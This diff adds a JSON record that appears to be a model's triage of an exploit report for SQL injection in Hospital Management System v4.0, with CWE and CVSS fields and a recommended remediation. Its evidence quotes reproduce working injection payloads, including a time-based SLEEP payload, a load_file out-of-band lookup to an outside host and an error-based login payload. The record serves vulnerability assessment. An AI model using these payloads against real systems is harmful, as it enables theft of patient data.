@@ -1,0 +1,69 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "Multiple SQL injection vulnerabilities in Hospital Management System v4.0 allow an attacker to execute time-based blind, error-based, and UNION-based SQL queries via parameters such as txtName (contact form) and login-related POST parameters, potentially exposing sensitive information.",
+    "affected_product": "Hospital Management System v4.0",
+    "cwe": "CWE-89",
+    "cwe_quote": "The Hospital Management System v4.0 is suffering from Multiple\nSQL-Injections via three parameters in function.php,  contact.php, and\nfunc3.php applications.",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "Parameter: txtName (POST)"
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "N",
+        "quote": "Parameter: txtName (POST)"
+      },
+      "UI": {
+        "value": "N",
+        "quote": ""
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "H",
+        "quote": "The attacker can be receiving the all information from the system by\nusing this vulnerability, and also the malicious actor can use\nsensitive information from the customers of this system."
+      },
+      "I": {
+        "value": "H",
+        "quote": "The attacker can be receiving the all information from the system by\nusing this vulnerability, and also the malicious actor can use\nsensitive information from the customers of this system."
+      },
+      "A": {
+        "value": "N",
+        "quote": ""
+      }
+    },
+    "recommended_next_step": "Attempt to reproduce against a local instance to confirm vulnerable endpoints and parameters, capture the exact vulnerable SQL statements, and determine required privileges; then notify vendor/maintainer and prepare a patch to parameterize queries.",
+    "confidence": "medium",
+    "evidence_quotes": [
+      {
+        "claim": "Report states multiple SQL injections in files and parameters",
+        "quote": "The Hospital Management System v4.0 is suffering from Multiple\nSQL-Injections via three parameters in function.php,  contact.php, and\nfunc3.php applications."
+      },
+      {
+        "claim": "Exploit shows time-based blind SQLi against txtName POST parameter",
+        "quote": "Parameter: txtName (POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: txtName=821761' AND (SELECT 9346 FROM\n(SELECT(SLEEP(3)))HJGv) AND\n'xkCZ'='xkCZ&txtEmail=xstxPhYW@https://github.com/kishan0725/Hospital-Management-System&txtPhone=813-439-23'+(select\nload_file('\\\\k0lnu24kl14z5bxcoo5tj7z4bvho5fz3q6ey1qpf.https://github.com/kishan0725/Hospital-Management-System\\hgq'))+'&btnSubmit=Send\nMessage&txtMsg=441931"
+      },
+      {
+        "claim": "Exploit shows error-based and UNION-based SQLi against login-related parameters",
+        "quote": "Type: error-based\n    Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)\n    Payload: email=riiVAqjG@https://github.com/kishan0725/Hospital-Management-System'+(select-2936)\nOR 1 GROUP BY CONCAT(0x7162706271,(SELECT (CASE WHEN (5080=5080) THEN\n1 ELSE 0 END)),0x716b767a71,FLOOR(RAND(0)*2)) HAVING\nMIN(0)#from(select(sleep(20)))a)+'&password2=d3U!l9k!E4&patsub=Login"
+      },
+      {
+        "claim": "Report claims attacker can obtain all information and sensitive customer data",
+        "quote": "The attacker can be receiving the all information from the system by\nusing this vulnerability, and also the malicious actor can use\nsensitive information from the customers of this system."
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 2606,
+    "output_tokens": 958,
+    "latency_s": null,
+    "batch": true
+  }
+}
